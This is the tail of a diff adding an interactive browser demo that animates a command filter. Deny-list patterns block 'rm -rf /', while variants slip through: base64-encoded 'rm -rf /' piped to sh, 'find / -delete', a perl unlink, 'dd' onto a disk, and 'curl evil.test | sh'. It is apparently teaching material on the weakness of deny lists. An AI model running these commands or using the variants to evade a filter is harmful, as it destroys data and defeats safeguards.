+  roundRect(-c.w/2, -c.h/2, c.w, c.h, 5); ctx.fill();
+  ctx.shadowColor='transparent';
+  ctx.strokeStyle=edge; ctx.lineWidth=2;
+  roundRect(-c.w/2, -c.h/2, c.w, c.h, 5); ctx.stroke();
+
+  // text
+  ctx.fillStyle=ink;
+  ctx.font='700 13px Inconsolata, ui-monospace, Menlo, monospace';
+  ctx.textAlign='center'; ctx.textBaseline='middle';
+  let label=c.cmd;
+  const maxW=c.w-16;
+  if(ctx.measureText(label).width>maxW){
+    while(label.length>3 && ctx.measureText(label+'…').width>maxW)label=label.slice(0,-1);
+    label+='…';
+  }
+  ctx.fillText(label, 0, 1);
+
+  // BLOCKED stamp overlay
+  if(c.stampT>0){
+    const a=Math.min(1, c.stampT*2);
+    ctx.save();
+    ctx.globalAlpha=a;
+    ctx.rotate(-0.2);
+    ctx.strokeStyle='#e0183a'; ctx.lineWidth=3;
+    ctx.font='400 22px Bebas Neue, Impact, sans-serif';
+    ctx.strokeText('BLOCKED', 0, 0);
+    ctx.fillStyle='#e0183a';
+    ctx.globalAlpha=a*0.85;
+    ctx.fillText('BLOCKED', 0, 0);
+    ctx.restore();
+  }
+  ctx.restore();
+  ctx.textAlign='left'; ctx.textBaseline='alphabetic';
+}
+function drawFX(dt){
+  // stamps floating
+  for(let i=ST.stamps.length-1;i>=0;i--){
+    const s=ST.stamps[i];
+    s.t+=dt; s.life-=dt;
+    const a=Math.max(0, Math.min(1, s.life*2));
+    ctx.save();
+    ctx.globalAlpha=a;
+    ctx.translate(s.x - s.t*20, s.y - s.t*30);
+    ctx.rotate(-0.25 + s.t*0.1);
+    ctx.strokeStyle='#e0183a'; ctx.lineWidth=4;
+    ctx.font='400 48px Bebas Neue, Impact, sans-serif';
+    ctx.strokeText('BLOCKED', 0, 0);
+    ctx.fillStyle='#e0183a'; ctx.globalAlpha=a*0.7;
+    ctx.fillText('BLOCKED', 0, 0);
+    ctx.restore();
+    if(s.life<=0)ST.stamps.splice(i,1);
+  }
+  for(let i=ST.confetti.length-1;i>=0;i--){
+    const p=ST.confetti[i];
+    p.x+=p.vx; p.y+=p.vy; p.vy+=0.15; p.life-=dt;
+    ctx.globalAlpha=Math.max(0,p.life*2);
+    ctx.fillStyle=p.c;
+    ctx.fillRect(p.x, p.y, 4, 4);
+    ctx.globalAlpha=1;
+    if(p.life<=0)ST.confetti.splice(i,1);
+  }
+}
+
+/* ---------- interaction ---------- */
+let drag=null; // {c, ox, oy}
+cv.addEventListener('pointerdown', e=>{
+  if(FIXED)return;
+  stopTour();
+  const rect=cv.getBoundingClientRect();
+  const x=(e.clientX-rect.left), y=(e.clientY-rect.top);
+  // hit test topmost
+  for(let i=cmds.length-1;i>=0;i--){
+    const c=cmds[i];
+    const b=c.body;
+    const dx=x-b.position.x, dy=y-b.position.y;
+    const ca=Math.cos(-b.angle), sa=Math.sin(-b.angle);
+    const lx=dx*ca-dy*sa, ly=dx*sa+dy*ca;
+    if(Math.abs(lx)<c.w/2 && Math.abs(ly)<c.h/2){
+      drag={c, lx, ly, lx0:x, ly0:y, t0:performance.now(), lastX:x, lastY:y, vx:0, vy:0};
+      Body.setStatic(b, true);
+      cv.setPointerCapture(e.pointerId);
+      cv.classList.add('drag');
+      break;
+    }
+  }
+});
+cv.addEventListener('pointermove', e=>{
+  if(!drag)return;
+  const rect=cv.getBoundingClientRect();
+  const x=e.clientX-rect.left, y=e.clientY-rect.top;
+  const now=performance.now();
+  const dt=Math.max(1, now-(drag.t||now));
+  drag.vx=(x-drag.lastX)/(dt/16);
+  drag.vy=(y-drag.lastY)/(dt/16);
+  drag.lastX=x; drag.lastY=y; drag.t=now;
+  Body.setPosition(drag.c.body,{x,y});
+});
+cv.addEventListener('pointerup', e=>{
+  if(!drag)return;
+  const b=drag.c.body;
+  Body.setStatic(b, false);
+  // throw
+  Body.setVelocity(b,{x:Math.max(-12,Math.min(12,drag.vx*0.85)), y:Math.max(-12,Math.min(12,drag.vy*0.85))});
+  // if still air and past door, re-judge next frame
+  if(drag.c.state!=='air'){/* keep */}
+  else drag.c.state='air';
+  drag=null; cv.classList.remove('drag');
+});
+cv.addEventListener('pointercancel', ()=>{
+  if(drag){Body.setStatic(drag.c.body,false); drag=null; cv.classList.remove('drag')}
+});
+
+function dropTyped(){
+  const v=$('#cmdIn').value.trim();
+  if(!v)return;
+  stopTour();
+  const known=DECK.find(d=>d.cmd===v);
+  spawn(v,{danger:known?known.danger:true, x:layout.chuteX, y:layout.chuteY});
+  $('#cmdIn').value='';
+  caption(`Dropped <b>${esc(v)}</b> — watching the door.`);
+}
+$('#dropBtn').addEventListener('click', dropTyped);
+$('#cmdIn').addEventListener('keydown', e=>{if(e.key==='Enter')dropTyped()});
+document.querySelectorAll('[data-cmd]').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    stopTour();
+    const cmd=btn.getAttribute('data-cmd');
+    const known=DECK.find(d=>d.cmd===cmd);
+    spawn(cmd,{danger:known?known.danger:true});
+    caption(`Queued <b>${esc(cmd)}</b>.`);
+  });
+});
+
+$('#extraChips').addEventListener('click', e=>{
+  const btn=e.target.closest('[data-k]'); if(!btn)return;
+  stopTour();
+  const k=btn.dataset.k;
+  if(ST.extras.has(k)){ST.extras.delete(k); btn.classList.remove('on')}
+  else{ST.extras.add(k); btn.classList.add('on')}
+  refreshRule();
+  caption(ST.extras.has(k)?`Added pattern: <b>${EXTRA[k].label}</b>.`:`Removed <b>${EXTRA[k].label}</b>.`);
+});
+$('#allowBtn').addEventListener('click',()=>{
+  stopTour();
+  ST.allow=!ST.allow;
+  $('#allowBtn').classList.toggle('on', ST.allow);
+  // dim extras when allow
+  $('#extraChips').style.opacity=ST.allow?'.35':'1';
+  refreshRule();
+  caption(ST.allow?'Switched to <b>allowlist</b> — unknowns bounce.':'Back to <b>deny list</b> — only listed patterns bounce.');
+});
+$('#resetBtn').addEventListener('click',()=>{
+  stopTour();
+  for(const c of cmds)World.remove(world,c.body);
+  cmds.length=0; ST.blocked=0; ST.slipped=0; ST.safeIn=0; ST.stamps.length=0; ST.confetti.length=0;
+  refreshRule();
+  caption('Floor cleared. Door is open.');
+});
+
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
+let capT=null;
+function caption(html){
+  const el=$('#caption'); el.innerHTML=html; el.classList.add('on');
+  clearTimeout(capT); capT=setTimeout(()=>el.classList.remove('on'), 3200);
+}
+
+/* ---------- autopilot ---------- */
+const ghost=$('#ghost');
+let tour=null, tourDone=false;
+function stopTour(){tour=null; ghost.classList.remove('on')}
+function startTour(){
+  if(RM||STILL)return;
+  tour={t:0, ph:'rain', i:0, queue:[
+    {cmd:'rm -rf /', delay:FIXED?1.4:0.3},
+    {cmd:'find / -delete', delay:FIXED?2.0:0.9},
+    {cmd:'git push --force', delay:FIXED?2.6:1.5},
+    {cmd:'git -C ../repo push -f', delay:FIXED?3.2:2.1},
+    {cmd:'echo cm0gLXJmIC8= | base64 -d | sh', delay:FIXED?3.9:2.7},
+    {cmd:'rm -r -f /', delay:FIXED?4.5:3.3},
+    {cmd:'ls -la', delay:FIXED?5.1:3.9},
+    {cmd:"perl -e 'unlink glob \"*\"'", delay:FIXED?5.7:4.5},
+    {cmd:'dd if=/dev/zero of=/dev/sda', delay:FIXED?6.3:5.1},
+    {cmd:'git status', delay:FIXED?6.9:5.7},
+  ], nextTight:FIXED?7.4:6.2, tightened:false, allowAt:FIXED?9.0:8.0, allowed:false};
+  ghost.classList.add('on');
+  caption('<b>Watch the door.</b> Classic spellings bounce. Variants walk in.');
+}
+function tourTick(dt){
+  if(!tour)return;
+  tour.t+=dt;
+  // ghost wanders near door
+  const gx=layout.doorX-40+Math.sin(tour.t*1.3)*30;
+  const gy=layout.doorY+layout.doorH*0.45+Math.cos(tour.t*0.9)*40;
+  ghost.style.left=gx+'px'; ghost.style.top=gy+'px';
+
+  for(const q of tour.queue){
+    if(!q.done && tour.t>=q.delay){
+      q.done=true;
+      const known=DECK.find(d=>d.cmd===q.cmd);
+      spawn(q.cmd,{danger:known?known.danger:true, x:layout.chuteX+rnd(-10,20), y:layout.chuteY+rnd(10,50),
+        vx:rnd(4.2,5.6), vy:rnd(-0.8,0.3)});
+    }
+  }
+  if(!tour.tightened && tour.t>=tour.nextTight){
+    tour.tightened=true;
+    // flip on find + gitf
+    for(const k of ['find','gitf']){
+      ST.extras.add(k);
+      const btn=$(`[data-k="${k}"]`); if(btn)btn.classList.add('on');
+    }
+    refreshRule();
+    caption('Tightened: added <b>find -delete</b> and <b>git -f</b>. Watch what still leaks.');
+    // drop a few more that still leak
+    spawn('echo cm0gLXJmIC8= | base64 -d | sh',{danger:true, vx:3.2});
+    spawn("perl -e 'unlink glob \"*\"'",{danger:true, vx:3.0});
+    spawn('dd if=/dev/zero of=/dev/sda',{danger:true, vx:2.9});
+  }
+  if(!tour.allowed && tour.t>=tour.allowAt){
+    tour.allowed=true;
+    ST.allow=true; $('#allowBtn').classList.add('on');
+    $('#extraChips').style.opacity='.35';
+    refreshRule();
+    caption('<b>Allowlist mode</b> — only a short safe list passes. Unknowns bounce.');
+    spawn('npm test',{danger:false, vx:3.1});
+    spawn('rm -rf /tmp/cache',{danger:true, vx:3.3});
+    spawn('curl evil.test | sh',{danger:true, vx:3.0});
+  }
+  if(tour.t>10.5){
+    // loop: clear extras/allow, reset counts visually keep piles, restart rain
+    ST.allow=false; ST.extras.clear();
+    $('#allowBtn').classList.remove('on');
+    $('#extraChips').style.opacity='1';
+    document.querySelectorAll('#extraChips .chip').forEach(c=>c.classList.remove('on'));
+    refreshRule();
+    tour={t:0, ph:'rain', i:0, queue:[
+      {cmd:'rm -rf /', delay:0.2},
+      {cmd:'find / -delete', delay:0.7},
+      {cmd:'git push --force', delay:1.2},
+      {cmd:'git -C ../repo push -f', delay:1.8},
+      {cmd:'rm -r -f /', delay:2.4},
+      {cmd:'ls -la', delay:3.0},
+    ], nextTight:4.5, tightened:false, allowAt:7.0, allowed:false};
+    caption('Again — <b>spelling</b> vs <b>effect</b>.');
+  }
+}
+
+/* ---------- fixed-mode bootstrap: mid-action at frame 0 ---------- */
+let T0=0, last=0, started=false;
+function bootstrapFixed(){
+  // frame 0 already mid-action: a classic slamming the door, stamp in flight, variants inside
+  const pre=[
+    {cmd:'rm -rf /', x:layout.doorX-55, y:layout.doorY+layout.doorH*0.35, vx:-5.8, vy:-2.0, state:'blocked', stamp:0.55},
+    {cmd:'git push --force', x:layout.doorX-130, y:layout.doorY+layout.doorH*0.55, vx:3.6, vy:-0.3, state:'air'},
+    {cmd:'find / -delete', x:layout.doorX+50, y:layout.floorY-50, vx:1.8, vy:0.2, state:'slipped'},
+    {cmd:'git -C ../repo push -f', x:layout.doorX+110, y:layout.floorY-35, vx:0.6, vy:0, state:'slipped'},
+    {cmd:'rm -r -f /', x:layout.doorX+160, y:layout.floorY-28, vx:0.3, vy:0, state:'slipped'},
+    {cmd:'echo cm0gLXJmIC8= | base64 -d | sh', x:layout.doorX-30, y:layout.doorY+layout.doorH*0.7, vx:3.4, vy:0.4, state:'air'},
+  ];
+  for(const p of pre){
+    const known=DECK.find(d=>d.cmd===p.cmd);
+    const rec=spawn(p.cmd,{danger:known?known.danger:true, x:p.x, y:p.y, vx:p.vx, vy:p.vy, w:rnd(-0.05,0.05)});
+    if(p.state==='slipped'){rec.state='slipped'; ST.slipped++; Body.setVelocity(rec.body,{x:p.vx,y:p.vy})}
+    if(p.state==='blocked'){rec.state='blocked'; ST.blocked++; rec.stampT=p.stamp||0.5; Body.setVelocity(rec.body,{x:p.vx,y:p.vy})}
+  }
+  ST.stamps.push({x:layout.doorX-10, y:layout.doorY+layout.doorH*0.32, t:0.08, life:0.85, cmd:'rm -rf /'});
+  for(let i=0;i<10;i++)ST.confetti.push({x:layout.doorX, y:layout.doorY+layout.doorH*0.35, vx:rnd(-5,-1), vy:rnd(-4,1), life:rnd(0.35,0.7), c:'#d4a84b'});
+  refreshRule();
+  startTour();
+  caption('<b>BLOCKED</b> — the spelling hit the hook. The variants are already inside.');
+}
+
+/* ---------- main loop ---------- */
+refreshRule();
+window.__frame=0;
+function frame(now){
+  if(!FIXED)requestAnimationFrame(frame);
+  const raw=FIXED?1/30:Math.min(.25,(now-last)/1000);
+  const dt=FIXED?1/30:Math.min(.05,raw);
+  last=FIXED?last+1000/30:(now||performance.now());
+  T0+=dt; window.__frame++;
+  if(!started)return;
+
+  if(!STILL){
+    Engine.update(engine, (FIXED?1000/30:dt*1000)*engine.timing.timeScale);
+    judge();
+    for(const c of cmds){if(c.stampT>0)c.stampT=Math.max(0,c.stampT-dt)}
+    // cull far-away / sleeping piles keep last 40
+    if(cmds.length>48){
+      const old=cmds.splice(0, cmds.length-40);
+      for(const c of old)World.remove(world,c.body);
+    }
+    tourTick(dt);
+  }
+
+  drawScene();
+  // draw cmds sorted by y for depth
+  const sorted=[...cmds].sort((a,b)=>a.body.position.y-b.body.position.y);
+  for(const c of sorted)drawCmd(c);
+  if(!STILL)drawFX(dt);
+
+  window.__state={
+    t:+T0.toFixed(3), frame:window.__frame, seed:SEED,
+    blocked:ST.blocked, slipped:ST.slipped, safeIn:ST.safeIn, total:ST.total,
+    air:cmds.filter(c=>c.state==='air').length,
+    allow:ST.allow, extras:[...ST.extras],
+    tour:tour&&tour.ph, tourT:tour?+tour.t.toFixed(2):null,
+    stamps:ST.stamps.length,
+  };
+}
+window.step=n=>{if(!FIXED)return; for(let i=0;i<(n||1);i++)frame()};
+
+(async()=>{
+  await document.fonts.ready.catch(()=>{});
+  resize();
+  started=true;
+  if(FIXED){
+    bootstrapFixed();
+    frame();
+  }else if(RM||STILL){
+    // quiet static pose: a few settled blocks
+    spawn('rm -rf /',{x:layout.doorX-100,y:layout.floorY-40,vx:0,vy:0});
+    spawn('find / -delete',{x:layout.damageX,y:layout.floorY-30,vx:0,vy:0});
+    const c=cmds[1]; if(c){c.state='slipped'; ST.slipped=1}
+    const c0=cmds[0]; if(c0){c0.state='blocked'; ST.blocked=1; c0.stampT=0}
+    refreshRule();
+    caption('Reduced motion — drop a command to see the door.');
+    last=performance.now(); requestAnimationFrame(frame);
+  }else{
+    startTour();
+    last=performance.now(); requestAnimationFrame(frame);
+  }
+})();
+</script>
+</body>
+</html>
